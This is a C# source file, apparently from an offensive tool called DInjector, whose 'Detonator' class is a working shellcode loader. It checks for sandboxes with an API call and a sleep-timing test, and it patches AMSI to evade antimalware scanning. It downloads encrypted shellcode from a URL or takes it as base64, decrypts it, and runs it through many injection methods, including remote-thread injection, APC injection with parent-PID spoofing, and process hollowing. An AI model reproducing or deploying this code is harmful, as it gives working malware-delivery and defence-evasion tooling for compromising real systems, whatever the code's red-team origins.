using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace DInjector
{
    class Detonator
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect,
            UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Boom(string[] args)
        {
            // Check if we're in a sandbox by calling a rare-emulated API
            if (VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
                return;
            }

            // Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
            var rand = new Random();
            uint dream = (uint)rand.Next(2000, 3000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                Console.WriteLine("(Sleep) [-] Failed check");
                return;
            }

            var options = ArgumentParser.Parse(args);

            // Bypass AMSI
            try
            {
                if (bool.Parse(options["/am51"]))
                    AM51.Patch();
            }
            catch (Exception)
            { }

            var commandName = string.Empty;
            foreach (KeyValuePair<string, string> item in options)
                if (item.Value == string.Empty)
                    commandName = item.Key;

            var shellcodePath = options["/sc"];
            var password = options["/password"];

            byte[] shellcodeEncrypted;
            if (shellcodePath.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                Console.WriteLine("(Detonator) [*] Loading shellcode from URL");
                WebClient wc = new WebClient();
                ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | (SecurityProtocolType)768 | (SecurityProtocolType)3072;
                MemoryStream ms = new MemoryStream(wc.DownloadData(shellcodePath));
                BinaryReader br = new BinaryReader(ms);
                shellcodeEncrypted = br.ReadBytes(Convert.ToInt32(ms.Length));
            }
            else
            {
                Console.WriteLine("(Detonator) [*] Loading shellcode from base64 input");
                shellcodeEncrypted = Convert.FromBase64String(shellcodePath);
            }

            AES ctx = new AES(password);
            var shellcodeBytes = ctx.Decrypt(shellcodeEncrypted);

            switch (commandName)
            {
                case "functionpointer":
                    FunctionPointer.Execute(shellcodeBytes);
                    break;
                case "functionpointerv2":
                    FunctionPointerV2.Execute(shellcodeBytes);
                    break;
                case "clipboardpointer":
                    ClipboardPointer.Execute(shellcodeBytes);
                    break;
                case "currentthread":
                    CurrentThread.Execute(shellcodeBytes);
                    break;
                case "currentthreaduuid":
                    string shellcodeUuids = System.Text.Encoding.UTF8.GetString(shellcodeBytes);
                    CurrentThreadUuid.Execute(shellcodeUuids);
                    break;
                case "remotethread":
                    RemoteThread.Execute(
                        shellcodeBytes,
                        int.Parse(options["/pid"]));
                    break;
                case "remotethreaddll":
                    RemoteThreadDll.Execute(
                        shellcodeBytes,
                        int.Parse(options["/pid"]),
                        options["/dll"]);
                    break;
                case "remotethreadview":
                    RemoteThreadView.Execute(
                        shellcodeBytes,
                        int.Parse(options["/pid"]));
                    break;
                case "remotethreadsuspended":
                    RemoteThreadSuspended.Execute(
                        shellcodeBytes,
                        int.Parse(options["/pid"]));
                    break;
                case "remotethreadapc":
                    RemoteThreadAPC.Execute(
                        shellcodeBytes,
                        options["/image"],
                        int.Parse(options["/ppid"]),
                        bool.Parse(options["/blockDlls"]));
                    break;
                case "remotethreadcontext":
                    RemoteThreadContext.Execute(
                        shellcodeBytes,
                        options["/image"],
                        int.Parse(options["/ppid"]),
                        bool.Parse(options["/blockDlls"]));
                    break;
                case "processhollow":
                    ProcessHollow.Execute(
                        shellcodeBytes,
                        options["/image"],
                        int.Parse(options["/ppid"]),
                        bool.Parse(options["/blockDlls"]));
                    break;
            }
        }
    }
}
